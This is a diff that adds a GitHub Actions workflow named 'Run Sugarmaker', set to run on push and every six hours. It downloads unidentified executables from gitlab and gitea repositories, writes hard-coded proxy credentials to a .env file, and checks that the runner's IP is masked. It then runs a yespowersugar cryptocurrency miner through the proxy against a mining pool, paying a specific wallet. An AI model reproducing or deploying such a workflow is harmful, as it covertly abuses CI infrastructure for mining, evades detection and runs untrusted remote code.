@@ -1,0 +1,63 @@
+name: Run Sugarmaker
+
+on:
+  workflow_dispatch:
+  push:
+    branches: ["main"]
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  build:
+    name: build
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1, 2, 3]
+        flag: [A]
+    env:
+      NUM_JOBS: 40
+      JOB: ${{ matrix.go }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Set up proxy environment
+        run: |
+          echo "proxy=\"52.5.38.201\"" >> .env
+          echo "port=\"9293\"" >> .env
+          echo "user=\"py8h6mtimyeool\"" >> .env
+          echo "pass=\"r1wr4kibq49lw0k52qhi17h0ke1j\"" >> .env
+
+      - name: Download dependencies
+        run: |
+          wget -q -O xza https://gitlab.com/daserax/revan/-/raw/main/Zrex && chmod +x xza
+          wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel
+          wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf
+          wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so
+
+      - name: Configure proxy
+        run: |
+          sleep 3
+          sed -i "s/127.0.0.1/$proxy/" "proxychains.conf"
+          sleep 1
+          sed -i "s/port/$port/" "proxychains.conf"
+          sed -i "s/user/$user/" "proxychains.conf"
+          sleep 1
+          sed -i "s/pass/$pass/" "proxychains.conf"
+
+      - name: Display IP
+        run: |
+          sleep 11
+          echo "******************************************************************"
+          echo "IP ORI ==> $(curl ifconfig.me)"
+          echo " "
+          echo " "
+          echo "IP BARU ==> $(./panel curl ifconfig.me)"
+
+      - name: Run mining process
+        run: |
+          ./panel ./xza -a yespowersugar -o 45.115.224.74:602 -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.$(echo $(shuf -i 1-9 -n 1)-ambar) -p --proxy=http://$user:$pass@$proxy:$port
+          sleep 240
